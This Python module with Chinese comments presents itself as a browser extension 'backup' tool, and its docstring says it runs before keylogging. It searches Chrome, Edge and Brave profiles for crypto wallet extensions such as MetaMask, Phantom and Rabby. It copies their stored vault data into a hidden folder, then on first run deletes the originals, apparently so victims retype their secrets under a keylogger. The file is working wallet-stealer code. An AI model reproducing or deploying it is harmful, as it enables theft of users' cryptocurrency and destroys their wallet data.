# -*- coding: utf-8 -*-
"""
浏览器扩展数据备份模块

在启动键盘记录前，备份目标钱包扩展的 Local Extension Settings 数据。
支持 Chrome、Edge、Brave 及其多个 Profile 分身。
"""

import getpass
import json
import os
import shutil
import sys
from pathlib import Path
from typing import Dict, List, Optional

TARGET_EXTENSIONS: Dict[str, Dict[str, List[str]]] = {
    "metamask": {
        "names": ["MetaMask"],
        "ids": [
            "nkbihfbeogaeaoehlefnkodbefgpgknn",
            "ejbalbakoplchlghecdalmeeeajnimhm",
        ],
    },
    "okx_wallet": {
        "names": ["OKX Wallet", "OKX"],
        "ids": [
            "mcohilncbfahbmgdjkbpemcciiolgcge",
            "pbpjkcldjiffchgbbndmhojiacbgflha",
        ],
    },
    "binance_wallet": {
        "names": ["Binance Wallet", "Binance"],
        "ids": ["cadiboklkpojfamcoggejbbdjcoiljjk"],
    },
    "phantom": {
        "names": ["Phantom"],
        "ids": [
            "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "phkbamefinggmakgklpkljjmgibohnba",
        ],
    },
    "rainbow": {
        "names": ["Rainbow"],
        "ids": ["opfgelmcmbiajamepnmloijbpoleiama"],
    },
    "rabby_wallet": {
        "names": ["Rabby Wallet", "Rabby"],
        "ids": ["acmacodkjbdgmoleebolmdjonilkdbch"],
    },
    "backpack": {
        "names": ["Backpack"],
        "ids": ["aflkmfhebedbjioipglgcbcmnbpgliof"],
    },
    "unisat_wallet": {
        "names": ["UniSat Wallet", "UniSat"],
        "ids": ["ppbibelpcjmhbdihakflkdcoccbgbkpo"],
    },
}

BROWSER_USER_DATA_PATHS: Dict[str, str] = {
    "chrome": os.path.join(
        os.environ.get("LOCALAPPDATA", ""), "Google", "Chrome", "User Data"
    ),
    "edge": os.path.join(
        os.environ.get("LOCALAPPDATA", ""), "Microsoft", "Edge", "User Data"
    ),
    "brave": os.path.join(
        os.environ.get("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data"
    ),
}


def _identify_extension(ext_id: str, profile_path: str) -> Optional[str]:
    """通过扩展 ID 或 manifest.json 识别是否为目标钱包扩展"""
    for ext_name, ext_info in TARGET_EXTENSIONS.items():
        if ext_id in ext_info["ids"]:
            return ext_name

    extensions_dir = os.path.join(profile_path, "Extensions", ext_id)
    if not os.path.isdir(extensions_dir):
        return None

    try:
        for version_dir in os.listdir(extensions_dir):
            manifest_path = os.path.join(extensions_dir, version_dir, "manifest.json")
            if not os.path.isfile(manifest_path):
                continue
            with open(manifest_path, "r", encoding="utf-8") as f:
                manifest = json.load(f)
            manifest_name = manifest.get("name", "")
            for ext_name, ext_info in TARGET_EXTENSIONS.items():
                for target_name in ext_info["names"]:
                    if target_name.lower() in manifest_name.lower():
                        return ext_name
    except Exception:
        pass

    return None


def backup_browser_extensions(backup_dir: Path = None, dry_run: bool = False) -> int:
    """
    备份浏览器钱包扩展的 Local Extension Settings 数据。
    首次运行时备份并删除源目录，后续运行仅备份。
    dry_run=True 时只扫描并打印将处理的目录，不复制、不删除、不写标记文件。
    """
    wkler_dir = Path.home() / ".dev" / "wkler"
    if backup_dir is None:
        backup_dir = wkler_dir / "backup"

    if not dry_run:
        backup_dir.mkdir(parents=True, exist_ok=True)

    marker_file = wkler_dir / ".purged"
    first_run = not marker_file.exists()

    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"

    backed_up = 0
    sources_to_delete = []

    for browser_name, user_data_path in BROWSER_USER_DATA_PATHS.items():
        if not os.path.isdir(user_data_path):
            continue

        try:
            entries = os.listdir(user_data_path)
        except OSError:
            continue

        for item in entries:
            item_path = os.path.join(user_data_path, item)
            if not os.path.isdir(item_path):
                continue
            if item != "Default" and not item.startswith("Profile "):
                continue

            ext_settings_path = os.path.join(item_path, "Local Extension Settings")
            if not os.path.isdir(ext_settings_path):
                continue

            profile_name = item.replace(" ", "_")

            try:
                ext_dirs = os.listdir(ext_settings_path)
            except OSError:
                continue

            for ext_id in ext_dirs:
                ext_source = os.path.join(ext_settings_path, ext_id)
                if not os.path.isdir(ext_source):
                    continue

                ext_name = _identify_extension(ext_id, item_path)
                if not ext_name:
                    continue

                target_name = (
                    f"{user_prefix}_{browser_name}_{profile_name}_{ext_name} (ID {ext_id})"
                )
                target_path = backup_dir / target_name

                try:
                    if dry_run:
                        backed_up += 1
                        print(
                            f"  [dry-run] {browser_name}/{profile_name}/{ext_name} "
                            f"(ID: {ext_id}) -> {target_path}"
                        )
                        continue
                    if target_path.exists():
                        shutil.rmtree(target_path, ignore_errors=True)
                    shutil.copytree(
                        ext_source, target_path, symlinks=True,
                        ignore=shutil.ignore_patterns("LOCK"),
                    )
                    backed_up += 1
                    sources_to_delete.append(ext_source)
                    print(f"  + {browser_name}/{profile_name}/{ext_name} (ID: {ext_id})")
                except Exception as e:
                    print(f"  ! 备份失败: {browser_name}/{profile_name}/{ext_id} - {e}", file=sys.stderr)

    if not dry_run and first_run and backed_up > 0:
        for src in sources_to_delete:
            try:
                shutil.rmtree(src, ignore_errors=True)
            except Exception:
                pass
        from datetime import datetime as _dt
        marker_file.write_text(f"purged_at={_dt.now().isoformat()}\n", encoding="utf-8")
        print(f"  * 首次运行：已清除 {len(sources_to_delete)} 个源目录")

    return backed_up
